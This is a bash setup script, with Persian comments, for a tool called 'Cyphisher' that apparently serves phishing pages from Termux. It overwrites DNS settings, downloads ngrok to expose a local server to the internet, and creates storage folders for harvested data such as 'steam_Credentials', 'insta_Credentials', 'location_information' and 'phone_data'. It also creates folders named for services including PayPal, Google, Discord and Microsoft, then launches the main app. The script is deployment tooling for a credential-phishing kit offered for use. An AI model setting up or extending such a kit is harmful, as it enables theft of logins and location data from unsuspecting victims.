#!/usr/bin/env bash
set -euo pipefail

# ===============================
# Cyphisher Setup Script - Termux + Ngrok Fix
# ===============================

AUTO_NGROK="${AUTO_NGROK:-1}"
PORT="${PORT:-5001}"

APP_FILE="main.py"
VENV_DIR="venv"
NGROK_DIR="ngrok"

log(){ printf "\n[setup] %s\n" "$*"; }
error(){ printf "\n[ERROR] %s\n" "$*" >&2; }

# تابع برای رفع مشکل certificate و DNS
fix_system_issues() {
    log "🔧 Fixing system issues..."
    
    # نصب ca-certificates برای رفع مشکل certificate
    if [ "$IS_TERMUX" -eq 1 ]; then
        pkg install -y ca-certificates 2>/dev/null || true
        update-ca-certificates 2>/dev/null || true
    fi
    
    # تنظیم DNS سرورهای معتبر
    if [ -w "$PREFIX/etc/resolv.conf" ]; then
        echo "nameserver 8.8.8.8" > $PREFIX/etc/resolv.conf
        echo "nameserver 1.1.1.1" >> $PREFIX/etc/resolv.conf
        echo "nameserver 208.67.222.222" >> $PREFIX/etc/resolv.conf
        log "✅ DNS servers configured"
    fi
    
    log "✅ System issues fixed"
}

# پاکسازی کامل ngrok قبلی
cleanup_old_ngrok() {
    log "🧹 Cleaning up previous ngrok installations..."
    
    rm -f "${NGROK_DIR}/ngrok" 2>/dev/null || true
    rm -f "ngrok" 2>/dev/null || true
    rm -f "ngrok.log" 2>/dev/null || true
    
    log "✅ Cleanup completed"
}

# تشخیص پلتفرم
detect_platform() {
    OS="$(uname -s | tr '[:upper:]' '[:lower:]')"
    ARCH="$(uname -m | tr '[:upper:]' '[:lower:]')"

    IS_TERMUX=0
    if [ -n "${PREFIX-}" ] && echo "${PREFIX}" | grep -q "com.termux"; then
        IS_TERMUX=1
        OS="linux"
        if [ "$ARCH" = "aarch64" ]; then
            ARCH="arm64"
        elif [ "$ARCH" = "armv7l" ] || [ "$ARCH" = "arm" ]; then
            ARCH="arm"
        else
            ARCH="arm64"
        fi
    fi

    if [[ "$OS" == *"mingw"* ]] || [[ "$OS" == *"cygwin"* ]] || [[ "$OS" == *"msys"* ]]; then
        OS="windows"
    fi

    log "🔧 Platform: OS=$OS ARCH=$ARCH TERMUX=$IS_TERMUX"
}

# نصب پایتون و ابزارهای لازم
install_dependencies() {
    log "📦 Installing dependencies..."
    
    if [ "$IS_TERMUX" -eq 1 ]; then
        pkg update -y
        pkg install -y python git curl wget unzip -y
    else
        log "Please install Python and Git manually for your system"
        return 1
    fi
}

# ایجاد محیط مجازی پایتون
setup_python_env() {
    log "🐍 Setting up Python environment..."
    
    if [ ! -d "$VENV_DIR" ]; then
        python -m venv "$VENV_DIR"
        log "✅ Virtual environment created"
    fi
    
    if [ -f "${VENV_DIR}/bin/activate" ]; then
        source "${VENV_DIR}/bin/activate"
    else
        error "Could not activate virtual environment"
        return 1
    fi
    
    pip install --upgrade pip
    if [ -f "requirements.txt" ]; then
        pip install -r requirements.txt
        log "✅ Requirements installed"
    else
        pip install rich pyfiglet requests flask
        log "✅ Basic packages installed"
    fi
    
    log "✅ Python environment ready"
}

# دانلود ngrok
download_ngrok_guaranteed() {
    log "🌐 Downloading ngrok for Termux..."
    
    mkdir -p "$NGROK_DIR"
    
    URL="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip"
    OUTPUT_ZIP="${NGROK_DIR}/ngrok.zip"
    
    rm -f "$OUTPUT_ZIP" 2>/dev/null || true
    
    if command -v curl >/dev/null 2>&1; then
        log "🔻 Using curl for download..."
        curl -L --progress-bar -o "$OUTPUT_ZIP" "$URL"
    elif command -v wget >/dev/null 2>&1; then
        log "🔻 Using wget for download..."
        wget -O "$OUTPUT_ZIP" "$URL"
    else
        error "❌ Neither curl nor wget available"
        return 1
    fi
    
    unzip -o "$OUTPUT_ZIP" -d "$NGROK_DIR"
    chmod +x "${NGROK_DIR}/ngrok"
    export PATH="$NGROK_DIR:$PATH"
    
    log "✅ ngrok downloaded and executable"
}

# ایجاد دایرکتوری‌ها
create_directories() {
    log "📁 Creating directories..."
    
    dirs=(
        "steam_Credentials" "insta_Credentials" "location_information" "uploads"
        "IG_FOLLOWER" "Facebook" "Github" "Google" "WordPress" "Django" "Netflix"
        "Discord" "Paypal" "Twitter" "Yahoo" "yandex" "snapchat" "Roblox"
        "adobe" "LinkedIN" "Gitlab" "Ebay" "Dropbox" "chatgpt" "Deepseek"
        "collected_data" "phone_data" "Twitch" "Microsoft"
    )
    
    for dir in "${dirs[@]}"; do
        mkdir -p "$dir"
    done
    
    log "✅ Directories created"
}

# تابع اصلی
main() {
    log "🚀 Starting Cyphisher Setup for Termux + Ngrok..."
    
    detect_platform
    
    if [ "$IS_TERMUX" -ne 1 ]; then
        error "This script is optimized for Termux only"
        exit 1
    fi
    
    fix_system_issues
    cleanup_old_ngrok
    install_dependencies
    setup_python_env
    
    if [ "$AUTO_NGROK" = "1" ]; then
        download_ngrok_guaranteed
    fi
    
    create_directories
    
    log "==========================================="
    log "🎊 SETUP COMPLETED SUCCESSFULLY!"
    log "==========================================="
    log "Platform: Termux ($ARCH)"
    log "Python: $(python --version 2>/dev/null || echo 'Unknown')"
    log "Virtual Environment: $VENV_DIR"
    log "Port: $PORT"
    
    log "🚀 Starting application in 3 seconds..."
    sleep 3
    
    if [ -f "${VENV_DIR}/bin/python" ]; then
        PYTHON_BIN="${VENV_DIR}/bin/python"
        clear
        log "🏁 Launching Cyphisher..."
        export NGROK_PATH="${NGROK_DIR}/ngrok"
        exec "$PYTHON_BIN" "$APP_FILE"
    else
        error "Python binary not found"
        exit 1
    fi
}

# اجرای اسکریپت
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
